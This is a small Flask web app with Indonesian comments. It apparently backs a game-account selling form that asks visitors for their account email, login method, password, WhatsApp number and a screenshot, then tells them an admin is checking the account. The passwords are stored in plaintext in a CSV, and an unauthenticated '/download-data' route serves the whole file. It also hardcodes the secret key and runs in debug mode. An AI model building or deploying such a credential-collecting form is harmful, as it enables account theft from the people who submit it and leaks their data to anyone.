from flask import Flask, render_template, request, redirect, url_for, flash, send_file
import os
import csv
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Konfigurasi aplikasi
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['DATA_FILE'] = 'data.csv'
app.secret_key = "supersecretkey"  # Untuk flash messages

# Pastikan folder upload ada
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

# Pastikan file CSV ada
if not os.path.exists(app.config['DATA_FILE']):
    with open(app.config['DATA_FILE'], 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["User ID", "Server ID", "Email", "Login Method", "Password", "WhatsApp", "Price Offer", "File Path"])

# Fungsi menyimpan data ke CSV
def save_user_data(user_id, server_id, email, login_method, password, whatsapp, price_offer, file_path):
    with open(app.config['DATA_FILE'], 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([user_id, server_id, email, login_method, password, whatsapp, price_offer, file_path])

# Halaman utama
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        user_id = request.form["user_id"]
        server_id = request.form["server_id"]
        email = request.form["email"]
        login_method = request.form["login_method"]
        password = request.form["password"]
        whatsapp = request.form["whatsapp"]
        price_offer = request.form["price_offer"]

        # Handle file upload
        file_path = "No File"
        if "full_ss" in request.files:
            file = request.files["full_ss"]
            if file.filename:
                filename = secure_filename(file.filename)
                file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
                file.save(file_path)

        # Simpan data ke CSV
        save_user_data(user_id, server_id, email, login_method, password, whatsapp, price_offer, file_path)

        # Flash message
        flash("Harap tunggu, akun sedang dicek admin!", "info")

        return redirect(url_for("index"))

    return render_template("index.html")

# Endpoint untuk mendownload file yang diupload
@app.route("/download/<filename>")
def download_file(filename):
    file_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        return "File tidak ditemukan", 404

# Endpoint untuk mendownload semua data CSV
@app.route("/download-data")
def download_data():
    return send_file(app.config["DATA_FILE"], as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True)
